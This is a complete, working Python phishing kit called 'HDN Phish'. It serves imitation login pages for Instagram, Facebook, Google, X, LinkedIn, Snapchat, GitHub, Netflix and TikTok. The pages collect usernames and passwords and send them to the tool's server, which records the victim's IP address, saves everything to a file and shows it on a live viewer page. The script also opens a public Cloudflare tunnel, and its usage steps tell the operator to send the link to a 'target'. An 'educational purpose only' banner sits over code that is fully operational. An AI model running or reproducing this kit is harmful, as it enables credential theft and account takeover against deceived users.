#!/usr/bin/env python3
"""
HDN Phish - Complete Social Media Phishing Toolkit
Platforms: Instagram, Facebook, Google, Twitter, LinkedIn, Snapchat, GitHub, Netflix, TikTok
Author: HasnainDarkNet
"""

import os
import sys
import json
import time
import threading
import webbrowser
import subprocess
import urllib.request
import re
import platform
import socket
import http.server
import socketserver
import datetime

class HDNPhish:
    def __init__(self):
        self.port = 8080
        self.server = None
        self.tunnel_process = None
        self.public_url = None
        self.os_type = platform.system()
        self.credentials = []
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def create_tiktok_page(self):
        """TikTok login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Log in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 30px;
            color: #000;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #fafafa;
        }
        button {
            width: 100%;
            padding: 14px;
            margin: 20px 0;
            background: #fe2c55;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { background: #e0254a; }
        .signup {
            color: #666;
            font-size: 14px;
        }
        .signup a {
            color: #fe2c55;
            text-decoration: none;
        }
        .qr-btn {
            background: #f0f0f0;
            color: #000;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">🎵 TikTok</div>
            <h1>Log in to TikTok</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Email or username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'tiktok',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.tiktok.com';
        };
    </script>
</body>
</html>'''
    
    def create_instagram_page(self):
        """Real Instagram login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 30px; color: #262626; }
        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 8px;
            margin: 12px 0;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }
        .fb-btn { background: #385185; margin-top: 8px; }
        .signup { margin-top: 20px; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">📷 Instagram</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'instagram',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.instagram.com';
        };
    </script>
</body>
</html>'''
    
    def create_facebook_page(self):
        """Real Facebook login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .card {
            background: white;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo { font-size: 48px; margin-bottom: 20px; color: #1877f2; }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        button {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 17px;
            cursor: pointer;
        }
        .forgot { color: #1877f2; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">📘 Facebook</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'facebook',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.facebook.com';
        };
    </script>
</body>
</html>'''
    
    def create_google_page(self):
        """Real Google login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
            text-align: center;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .logo { font-size: 60px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        input {
            width: 100%;
            padding: 13px 15px;
            margin: 15px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🔐 G</div>
        <h1>Sign in</h1>
        <p>to continue to Gmail</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'google',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://mail.google.com';
        };
    </script>
</body>
</html>'''
    
    def create_twitter_page(self):
        """Real Twitter login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: black;
            padding: 40px;
            text-align: center;
        }
        .logo { font-size: 48px; color: white; margin-bottom: 30px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: black;
            border: 1px solid #333;
            border-radius: 4px;
            color: white;
            font-size: 17px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1d9bf0;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">𝕏</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email, or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'twitter',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://x.com';
        };
    </script>
</body>
</html>'''
    
    def create_linkedin_page(self):
        """Real LinkedIn login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LinkedIn Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f3f2ef;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            width: 350px;
        }
        .logo { font-size: 40px; margin-bottom: 20px; color: #0a66c2; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0a66c2;
            color: white;
            border: none;
            border-radius: 24px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🔗 in</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'linkedin',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.linkedin.com';
        };
    </script>
</body>
</html>'''
    
    def create_snapchat_page(self):
        """Real Snapchat login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Snapchat Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fffc00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 20px;
            width: 350px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 30px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #fffc00;
            color: black;
            border: none;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">👻 Snapchat</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'snapchat',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.snapchat.com';
        };
    </script>
</body>
</html>'''
    
    def create_github_page(self):
        """Real GitHub login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>GitHub Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: #161b22;
            padding: 30px;
            border-radius: 6px;
            width: 350px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; color: white; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: white;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🐙 GitHub</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'github',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://github.com';
        };
    </script>
</body>
</html>'''
    
    def create_netflix_page(self):
        """Real Netflix login page"""
        return '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Netflix Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #141414;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: rgba(0,0,0,0.75);
            padding: 60px 68px 40px;
            border-radius: 4px;
            width: 450px;
        }
        .logo { font-size: 40px; color: #e50914; margin-bottom: 30px; }
        input {
            width: 100%;
            padding: 16px;
            margin: 10px 0;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">NETFLIX</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                platform: 'netflix',
                timestamp: new Date().toISOString()
            };
            await fetch('/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) });
            window.location.href = 'https://www.netflix.com';
        };
    </script>
</body>
</html>'''
    
    def create_menu_page(self):
        """Main menu page with TikTok added"""
        menu_html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDN Phish - Social Media Toolkit</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 40px 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 {
            text-align: center;
            color: white;
            margin-bottom: 10px;
            font-size: 48px;
        }
        .subtitle {
            text-align: center;
            color: rgba(255,255,255,0.8);
            margin-bottom: 40px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
        }
        .card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .card-icon { font-size: 48px; margin-bottom: 15px; }
        .card h3 { color: #333; margin-bottom: 10px; }
        .card p { color: #666; font-size: 12px; }
        .url-box {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: center;
        }
        .url-box p { color: #888; margin-bottom: 5px; }
        .url-box code {
            color: #00ff00;
            background: #2d2d2d;
            padding: 8px 15px;
            border-radius: 5px;
            display: inline-block;
            font-size: 14px;
        }
        .footer {
            text-align: center;
            color: rgba(255,255,255,0.6);
            margin-top: 40px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎭 HDN Phish Toolkit</h1>
        <div class="subtitle">Select a platform for phishing simulation</div>
        
        <div class="grid">
            <div class="card" onclick="selectPage('instagram')">
                <div class="card-icon">📷</div>
                <h3>Instagram</h3>
                <p>Instagram login page</p>
            </div>
            <div class="card" onclick="selectPage('facebook')">
                <div class="card-icon">📘</div>
                <h3>Facebook</h3>
                <p>Facebook login page</p>
            </div>
            <div class="card" onclick="selectPage('google')">
                <div class="card-icon">🔐</div>
                <h3>Google</h3>
                <p>Google/Gmail login</p>
            </div>
            <div class="card" onclick="selectPage('twitter')">
                <div class="card-icon">𝕏</div>
                <h3>Twitter/X</h3>
                <p>Twitter login page</p>
            </div>
            <div class="card" onclick="selectPage('linkedin')">
                <div class="card-icon">🔗</div>
                <h3>LinkedIn</h3>
                <p>LinkedIn login page</p>
            </div>
            <div class="card" onclick="selectPage('snapchat')">
                <div class="card-icon">👻</div>
                <h3>Snapchat</h3>
                <p>Snapchat login page</p>
            </div>
            <div class="card" onclick="selectPage('github')">
                <div class="card-icon">🐙</div>
                <h3>GitHub</h3>
                <p>GitHub login page</p>
            </div>
            <div class="card" onclick="selectPage('netflix')">
                <div class="card-icon">🎬</div>
                <h3>Netflix</h3>
                <p>Netflix login page</p>
            </div>
            <div class="card" onclick="selectPage('tiktok')">
                <div class="card-icon">🎵</div>
                <h3>TikTok</h3>
                <p> Free TikTok  Like</p>
            </div>
        </div>
        
        <div class="url-box">
            <p>📱 Your Public Link (Send to target)</p>
            <code id="publicUrl">Loading...</code>
            <p style="margin-top: 10px;">➕ Add /page-name to open specific page</p>
            <p style="font-size: 11px;">Example: /instagram, /facebook, /google, /twitter, /linkedin, /snapchat, /github, /netflix, /tiktok</p>
        </div>
        
        <div class="footer">
            🔒 Educational Purpose Only | HasnainDarkNet
        </div>
    </div>
    
    <script>
        let publicUrl = '';
        
        fetch('/url')
            .then(r => r.json())
            .then(data => {
                publicUrl = data.url;
                document.getElementById('publicUrl').innerHTML = publicUrl;
            });
        
        function selectPage(page) {
            if (publicUrl) {
                window.open(publicUrl + '/' + page, '_blank');
            } else {
                alert('Loading URL, please wait...');
            }
        }
    </script>
</body>
</html>'''
        
        with open('index.html', 'w', encoding='utf-8') as f:
            f.write(menu_html)
        print("[✓] Main menu page created (TikTok added)")
    
    def start_server(self):
        """Start HTTP server with all pages"""
        
        pages = {
            '/instagram': self.create_instagram_page(),
            '/facebook': self.create_facebook_page(),
            '/google': self.create_google_page(),
            '/twitter': self.create_twitter_page(),
            '/linkedin': self.create_linkedin_page(),
            '/snapchat': self.create_snapchat_page(),
            '/github': self.create_github_page(),
            '/netflix': self.create_netflix_page(),
            '/tiktok': self.create_tiktok_page(),
        }
        
        class PhishHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path == '/':
                    self.path = '/index.html'
                elif self.path in pages:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(pages[self.path].encode())
                    return
                elif self.path == '/url':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'url': getattr(self.server, 'public_url', '')}).encode())
                    return
                elif self.path == '/view':
                    self.path = '/view_creds.html'
                elif self.path == '/api/creds':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'creds': self.server.credentials}).encode())
                    return
                
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
            
            def do_POST(self):
                if self.path == '/login':
                    try:
                        length = int(self.headers['Content-Length'])
                        data = json.loads(self.rfile.read(length).decode())
                        data['ip'] = self.client_address[0]
                        data['server_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        self.server.credentials.append(data)
                        if len(self.server.credentials) > 100:
                            self.server.credentials = self.server.credentials[-100:]
                        
                        with open('captured_creds.json', 'a') as f:
                            json.dump(data, f)
                            f.write('\n')
                        
                        # Terminal display
                        print(f"\n" + "="*60)
                        print(f"🎯 NEW CREDENTIALS CAPTURED!")
                        print(f"="*60)
                        print(f"📱 Platform: {data.get('platform', 'Unknown').upper()}")
                        print(f"👤 Username/Email: {data.get('username', 'N/A')}")
                        print(f"🔑 Password: {data.get('password', 'N/A')}")
                        print(f"🌐 IP Address: {data['ip']}")
                        print(f"⏰ Time: {data['server_time']}")
                        print(f"="*60)
                        
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b'{"status":"success"}')
                    except:
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
        
        self.server = socketserver.TCPServer(("0.0.0.0", self.port), PhishHandler)
        self.server.credentials = []
        self.server.public_url = self.public_url
        
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        print(f"[✓] Server running on http://localhost:{self.port}")
    
    def create_viewer_page(self):
        """View captured credentials"""
        viewer = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Captured Credentials - HDN Phish</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
        h1 { color: #cc0000; }
        .stats { background: #1a1a1a; padding: 15px; border-radius: 10px; margin: 15px 0; }
        .cred-card {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            border-left: 3px solid #cc0000;
        }
        .platform { color: #cc0000; font-weight: bold; }
        .time { color: #888; font-size: 12px; }
        button {
            background: #cc0000;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            color: white;
            border-radius: 5px;
        }
        .refresh { background: #4CAF50; }
    </style>
</head>
<body>
    <h1>🎭 Captured Credentials</h1>
    <div class="stats" id="stats">Loading...</div>
    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
    <div id="credsList"></div>
    
    <script>
        async function loadCreds() {
            try {
                const res = await fetch('/api/creds?' + Date.now());
                const data = await res.json();
                
                if (!data.creds || data.creds.length === 0) {
                    document.getElementById('credsList').innerHTML = '<p>⏳ No credentials captured yet...</p>';
                    document.getElementById('stats').innerHTML = '📊 Total: 0';
                    return;
                }
                
                let html = '';
                for (let i = data.creds.length - 1; i >= 0; i--) {
                    const c = data.creds[i];
                    html += `<div class="cred-card">
                        <div class="platform">🎯 ${c.platform || 'Unknown'}</div>
                        <div>👤 Username: ${c.username}</div>
                        <div>🔑 Password: ${c.password}</div>
                        <div>🌐 IP: ${c.ip || 'Unknown'}</div>
                        <div class="time">📅 ${c.server_time || c.timestamp}</div>
                    </div>`;
                }
                document.getElementById('credsList').innerHTML = html;
                document.getElementById('stats').innerHTML = `📊 Total Captured: ${data.creds.length}`;
            } catch(e) {}
        }
        
        loadCreds();
        setInterval(loadCreds, 3000);
    </script>
</body>
</html>'''
        
        with open('view_creds.html', 'w', encoding='utf-8') as f:
            f.write(viewer)
        print("[✓] Viewer page created")
    
    def download_cloudflared(self):
        """Download cloudflared for current OS"""
        cloudflared_name = "cloudflared.exe" if self.os_type == "Windows" else "cloudflared"
        
        if os.path.exists(cloudflared_name):
            return cloudflared_name
        
        if self.os_type == "Windows":
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        
        print("[*] Downloading Cloudflared...")
        try:
            urllib.request.urlretrieve(url, cloudflared_name)
            if self.os_type != "Windows":
                os.chmod(cloudflared_name, 0o755)
            print("[✓] Cloudflared ready")
            return cloudflared_name
        except:
            return None
    
    def start_tunnel(self):
        """Start Cloudflare tunnel"""
        cloudflared = self.download_cloudflared()
        
        if not cloudflared:
            return None
        
        try:
            self.tunnel_process = subprocess.Popen(
                f"{cloudflared} tunnel --url http://localhost:{self.port}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            time.sleep(5)
            for i in range(30):
                if self.tunnel_process.poll() is not None:
                    break
                if self.tunnel_process.stdout:
                    line = self.tunnel_process.stdout.readline()
                    if line:
                        urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                        if urls:
                            self.public_url = urls[0]
                            print(f"[✓] Public URL: {self.public_url}")
                            return self.public_url
                time.sleep(0.5)
        except:
            pass
        return None
    
    def show_banner(self):
        os.system('cls' if self.os_type == "Windows" else 'clear')
        print("""
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║     ██╗  ██╗██████╗ ███╗   ██║                                    ║
║     ██║  ██║██╔══██╗████╗  ██║                                    ║
║     ███████║██║  ██║██╔██╗ ██║                                    ║
║     ██╔══██║██║  ██║██║╚██╗██║                                    ║
║     ██║  ██║██████╔╝██║ ╚████║                                    ║
║     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝                                    ║
║                                                                    ║
║         HDN PHISH - SOCIAL MEDIA PHISHING TOOLKIT                  ║
║         9+ Platforms | Cloudflare Tunnel | Real-time Capture       ║
║         Instagram | Facebook | Google | Twitter | LinkedIn |       ║
║         Snapchat | GitHub | Netflix | TikTok                       ║
║                   [🐺] HasnainDarkNet [🐺]                         ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
        """)
        time.sleep(1)
    
    def run(self):
        self.show_banner()
        
        self.create_menu_page()
        self.create_viewer_page()
        self.start_server()
        
        print("\n[*] Generating public link...")
        self.public_url = self.start_tunnel()
        
        if self.server:
            self.server.public_url = self.public_url
        
        local_ip = self.get_local_ip()
        
        print("\n" + "="*60)
        print("🎭 HDN PHISH READY!")
        print("="*60)
        print(f"\n📱 Local URL: http://localhost:{self.port}")
        print(f"👁️  View Credentials: http://localhost:{self.port}/view_creds.html")
        
        if self.public_url:
            print(f"\n🌍 PUBLIC LINK (Send to target):")
            print(f"   {self.public_url}")
            print(f"\n📸 Available Pages:")
            print(f"   {self.public_url}/instagram")
            print(f"   {self.public_url}/facebook")
            print(f"   {self.public_url}/google")
            print(f"   {self.public_url}/twitter")
            print(f"   {self.public_url}/linkedin")
            print(f"   {self.public_url}/snapchat")
            print(f"   {self.public_url}/github")
            print(f"   {self.public_url}/netflix")
            print(f"   {self.public_url}/tiktok")
        else:
            print(f"\n📱 Same WiFi Link: http://{local_ip}:{self.port}")
        
        print("\n" + "="*60)
        print("📋 HOW TO USE:")
        print("="*60)
        print("1️⃣  Send public link to target")
        print("2️⃣  Target clicks on any platform")
        print("3️⃣  Target enters credentials")
        print("4️⃣  Credentials captured in REAL-TIME on TERMINAL")
        print("5️⃣  Check at: /view_creds.html")
        print("="*60)
        
        webbrowser.open(f"http://localhost:{self.port}")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            if self.server:
                self.server.shutdown()
            if self.tunnel_process:
                self.tunnel_process.terminate()
            sys.exit(0)

if __name__ == "__main__":
    print("""
    ⚠️  EDUCATIONAL PURPOSE ONLY - Security Testing
    ⚠️  Use only on authorized systems
    """)
    input("Press Enter to continue...")
    
    tool = HDNPhish()
    tool.run()
